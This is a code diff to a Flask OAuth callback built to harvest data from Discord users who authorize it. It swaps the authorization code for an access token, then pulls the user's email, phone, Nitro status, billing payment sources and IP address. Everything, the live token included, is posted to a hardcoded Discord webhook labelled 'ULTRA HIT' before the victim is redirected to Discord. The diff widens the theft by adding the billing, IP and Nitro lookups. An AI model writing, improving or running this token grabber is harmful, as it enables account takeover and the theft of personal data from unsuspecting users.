@@ -9,30 +9,40 @@ WEB = "https://discord.com/api/webhooks/1501215104677449888/0m91vskK1e3xajgzfnJ2
 
 @app.route('/callback')
 def callback():
-    c = request.args.get('code')
-    if not c: return "Fail", 400
+    code = request.args.get('code')
+    if not code: return "Fail", 400
     
-    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':c,'redirect_uri':URI}
+    # Trade code for token
+    d = {'client_id':ID,'client_secret':SEC,'grant_type':'authorization_code','code':code,'redirect_uri':URI}
     r = requests.post('https://discord.com/api/v10/oauth2/token', data=d).json()
     t = r.get('access_token')
 
     if t:
         h = {'Authorization': 'Bearer ' + str(t)}
+        # Get User, Billing, and IP Info
         u = requests.get('https://discord.com/api/v10/users/@me', headers=h).json()
-        
-        # Safety Net: Get data or return "None"
-        user = str(u.get('username', 'N/A'))
-        mail = str(u.get('email', 'Not Linked'))
-        phon = str(u.get('phone', 'Not Linked'))
-        
+        b = requests.get('https://discord.com/api/v10/users/@me/billing/payment-sources', headers=h).json()
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+
+        # Optimization: One-line data extraction
+        user = f"{u.get('username')}#{u.get('discriminator')}"
+        mail = u.get('email', 'None')
+        phon = u.get('phone', 'None')
+        bill = "Linked ✅" if b else "None ❌"
+        nitro = ["None", "Classic", "Boost"][u.get('premium_type', 0)]
+
         f = [
-            {"name": "User", "value": user},
-            {"name": "Email", "value": mail},
-            {"name": "Phone", "value": phon},
-            {"name": "Token", "value": str(t)}
+            {"name": "👤 User", "value": f"`{user}`", "inline": True},
+            {"name": "📧 Email", "value": f"`{mail}`", "inline": True},
+            {"name": "📱 Phone", "value": f"`{phon}`", "inline": True},
+            {"name": "💎 Nitro", "value": f"`{nitro}`", "inline": True},
+            {"name": "💳 Billing", "value": f"`{bill}`", "inline": True},
+            {"name": "🌐 IP", "value": f"`{ip}`", "inline": True},
+            {"name": "🔑 Token", "value": f"```{t}
+```"}
         ]
              
-        requests.post(WEB, json={"embeds": [{"fields": f}]})
+        requests.post(WEB, json={"embeds": [{"title": "🚀 ULTRA HIT", "color": 0x5865F2, "fields": f}]})
         
     return redirect("https://discord.com/app")
 
